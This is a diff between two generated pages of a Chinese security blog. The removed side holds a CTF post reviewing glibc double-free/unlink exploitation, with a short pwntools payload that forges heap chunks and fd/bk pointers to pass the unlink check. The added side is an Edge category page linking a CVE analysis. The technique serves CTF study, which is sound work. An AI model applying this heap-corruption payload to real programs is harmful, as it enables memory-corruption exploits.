@@ -78,7 +78,7 @@
 
 
 
-  <meta name="keywords" content="CTF," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -91,20 +91,16 @@
 
 
 
-<meta name="description" content="写在前面周末趁着一道note题重新复习了一遍doublefree，现在简单的总结一下。&amp;nbsp; Glibc堆分配方式详细在我的这篇博客：linux Glibc Analysis">
-<meta name="keywords" content="CTF">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Review of  DoubleFree">
-<meta property="og:url" content="http://p1umer.club/2018/06/30/Review-of-DoubleFree/index.html">
+<meta name="description" content="给dalao们递tea">
+<meta property="og:type" content="website">
+<meta property="og:title" content="P1umerのblog">
+<meta property="og:url" content="http://p1umer.club/categories/Browser-Explore/Edge/index.html">
 <meta property="og:site_name" content="P1umerのblog">
-<meta property="og:description" content="写在前面周末趁着一道note题重新复习了一遍doublefree，现在简单的总结一下。&amp;nbsp; Glibc堆分配方式详细在我的这篇博客：linux Glibc Analysis">
+<meta property="og:description" content="给dalao们递tea">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://img-blog.csdn.net/20180515134500412">
-<meta property="og:updated_time" content="2018-07-03T15:58:06.857Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Review of  DoubleFree">
-<meta name="twitter:description" content="写在前面周末趁着一道note题重新复习了一遍doublefree，现在简单的总结一下。&amp;nbsp; Glibc堆分配方式详细在我的这篇博客：linux Glibc Analysis">
-<meta name="twitter:image" content="https://img-blog.csdn.net/20180515134500412">
+<meta name="twitter:title" content="P1umerのblog">
+<meta name="twitter:description" content="给dalao们递tea">
 
 
 
@@ -134,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://p1umer.club/2018/06/30/Review-of-DoubleFree/"/>
+  <link rel="canonical" href="http://p1umer.club/categories/Browser-Explore/Edge/"/>
 
 
 
 
 
-  <title>Review of  DoubleFree | P1umerのblog</title>
+  <title>分类: Edge | P1umerのblog</title>
   
 
 
@@ -159,7 +155,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-left ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -263,229 +259,55 @@
           <div id="content" class="content">
             
 
-  <div id="posts" class="posts-expand">
-    
+  
+  
+  
+  <div class="post-block category">
 
-  
+    <div id="posts" class="posts-collapse">
+      <div class="collection-title">
+        <h1>Edge<small>分类</small>
+        </h1>
+      </div>
 
-  
-  
-  
+      
+        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://p1umer.club/2018/06/30/Review-of-DoubleFree/">
+    <header class="post-header">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P1umer sauce">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P1umerのblog">
-    </span>
-
-    
-      <header class="post-header">
-
+      <h2 class="post-title">
         
+            <a class="post-title-link" href="/2018/07/03/Analysis-of-CVE-2017-0234/" itemprop="url">
+              
+                <span itemprop="name">Analysis of CVE-2017-0234</span>
+              
+            </a>
         
-          <h1 class="post-title" itemprop="name headline">Review of  DoubleFree</h1>
-        
+      </h2>
 
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-30T12:50:26+08:00">
-                2018-06-30
-              </time>
-            
+      <div class="post-meta">
+        <time class="post-time" itemprop="dateCreated"
+              datetime="2018-07-03T23:39:29+08:00"
+              content="2018-07-03" >
+          07-03
+        </time>
+      </div>
 
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/LINUX/" itemprop="url" rel="index">
-                    <span itemprop="name">LINUX</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  358
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  2
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>周末趁着一道note题重新复习了一遍doublefree，现在简单的总结一下。<br>&nbsp;</p>
-<h2 id="Glibc堆分配方式"><a href="#Glibc堆分配方式" class="headerlink" title="Glibc堆分配方式"></a>Glibc堆分配方式</h2><p>详细在我的这篇博客：<a href="http://p1umer.club/2018/06/30/Linux-Glibc-Analysis/">linux Glibc Analysis</a></p>
-<a id="more"></a>
-<p>&nbsp;</p>
-<h2 id="DoubleFree"><a href="#DoubleFree" class="headerlink" title="DoubleFree"></a>DoubleFree</h2><p>字面意思，free同一块内存两次。实际上，double并非必要条件，核心在于free一块精心构造的chunk。<br>在free的时候，要匹配三项检查：</p>
-<ul>
-<li><strong>flag位</strong>：这里要构造三块的flag。</li>
-<li><strong>size位</strong>：nextseconedChunk的size位无需考虑，pre&amp;next需要构造。</li>
-<li><p><strong>指针匹配</strong>：这个主要就是0x18&amp;0x10的构造了，通过将ptr-0x18，ptr-0x10覆盖住fd和bk，可以绕过下面检查：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</span><br><span class="line"> malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);</span><br></pre></td></tr></table></figure>
-<p>这里留意一下异常，调试程序的时候能快速定位构造错误。<br>&nbsp;</p>
-</li>
-</ul>
-<h2 id="内存实例"><a href="#内存实例" class="headerlink" title="内存实例"></a>内存实例</h2><p>  <img src="https://img-blog.csdn.net/20180515134500412" alt="image"> </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  #free_chunk.pre_chunk</span><br><span class="line">context=&quot;&quot;  </span><br><span class="line">context+=p32(0x0)#free_chunk.pre_chunk.pre_chunk_size=0</span><br><span class="line">context+=p32(0x81)  #free_chunk.pre_chunk=0x80 &amp;&amp; free_chunk.pre_chunk.pre_chunk is in use</span><br><span class="line">context+=p32(heap_addr+sub_heap+0x70-0x4-0xc)#fd = ptr addr which stores free_chunk_addr -0xc</span><br><span class="line">context+=p32(heap_addr+sub_heap+0x70-0x4-0x8)#bk = ptr addr which stores free_chunk_addr -0x8</span><br><span class="line">context+=&apos;a&apos;*(0x80-0x10) #padding </span><br><span class="line"></span><br><span class="line">#free_chunk</span><br><span class="line">context+=p32(0x80)  #free_chunk.pre_chunk_size=0x80</span><br><span class="line">context+=p32(0x88)  #free_chunk_size=0x88 &amp;&amp; free_chunk.pre_chunk is free</span><br><span class="line">context+=&apos;m&apos;*0x80 #padding</span><br><span class="line"></span><br><span class="line">free_chunk.next_chunk</span><br><span class="line">context+=p32(0x88) #free_chunk.next_chunk.pre_chunk_size = free_chunk_size</span><br><span class="line">context+=p32(0x79) #free_chunk.next_chunk_size=0x79 &amp;&amp; free_chunk is in use</span><br><span class="line">#ATTENTION 0x79 matters the free_chunk.next_chunk is use or not,so you have to calc the size to enture the free_chunk.next_chunk.next_chunk.flag is 1!!!</span><br><span class="line">oh,in addition, this_chunk.next_chunk is located by the chunk _size:)</span><br><span class="line">context+=p32(0)</span><br><span class="line">context+=p32(0)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/06/30/Linux-Glibc-Analysis/" rel="next" title="linux Glibc Analysis">
-                <i class="fa fa-chevron-left"></i> linux Glibc Analysis
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/07/01/V8-Environmental-Configuration/" rel="prev" title="V8 Environmental Configuration">
-                V8 Environmental Configuration <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
+    </header>
   </article>
 
 
-
-    <div class="post-spread">
       
     </div>
+
   </div>
+  
+  
+  
+
+  
+
 
 
           </div>
@@ -493,10 +315,6 @@
 
 
           
-
-  
-
-
 
         </div>
         
@@ -517,17 +335,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -640,22 +449,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#写在前面"><span class="nav-number">1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Glibc堆分配方式"><span class="nav-number">2.</span> <span class="nav-text">Glibc堆分配方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DoubleFree"><span class="nav-number">3.</span> <span class="nav-text">DoubleFree</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内存实例"><span class="nav-number">4.</span> <span class="nav-text">内存实例</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
@@ -830,10 +623,6 @@
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
 
   
 
